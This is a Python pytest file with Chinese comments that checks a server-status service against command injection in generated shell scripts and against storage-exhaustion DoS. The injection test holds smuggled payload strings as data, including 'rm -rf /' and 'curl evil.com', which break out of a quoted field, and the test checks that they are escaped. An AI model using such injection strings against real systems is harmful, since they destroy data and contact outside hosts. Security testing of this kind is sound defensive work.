"""
测试 Server Status 服务的安全性：
1. Shell 脚本生成防命令注入（特殊字符转义与 key 校验）
2. 上报存储防御无界增长 DoS
"""
import shlex
import pytest
from core.server_status_service import server_status_service, ServerStatusService


@pytest.fixture(autouse=True)
def isolate_server_status_storage(monkeypatch, tmp_path):
    temp_file = str(tmp_path / "server_status_records.json")
    monkeypatch.setattr("core.server_status_service._STORAGE_FILE", temp_file)
    from core.server_status_service import _pushed_server_data, _server_aliases
    orig_records = dict(_pushed_server_data)
    orig_aliases = dict(_server_aliases)
    _pushed_server_data.clear()
    _server_aliases.clear()
    yield
    _pushed_server_data.clear()
    _pushed_server_data.update(orig_records)
    _server_aliases.clear()
    _server_aliases.update(orig_aliases)


def test_generate_shell_script_escapes_command_injection_payloads():
    # 构造攻击载荷，企图闭合双引号并执行任意系统命令
    malicious_key = 'test"; rm -rf /; curl evil.com; "'
    malicious_url = 'http://127.0.0.1:8070/api/server-status?key=test"; touch /tmp/pwn; "'

    script = server_status_service.generate_shell_script(malicious_url, server_name=malicious_key)

    # 验证生成的脚本中，恶意载荷已被安全引用或清理，绝不能出现裸露的注入语句
    assert '"; rm -rf /;' not in script
    assert '"; touch /tmp/pwn;' not in script


def test_record_pushed_metrics_caps_maximum_stored_servers():
    svc = ServerStatusService()
    # 模拟攻击者伪造大量随机 key 企图耗尽内存与存储
    for i in range(150):
        svc.record_pushed_metrics(f"attacker_key_{i}", {"cpu_pct": 10.0})

    # 验证服务受控存储的最大节点数量不超过上限 (64)
    assert len(svc.pushed_server_data) <= 64
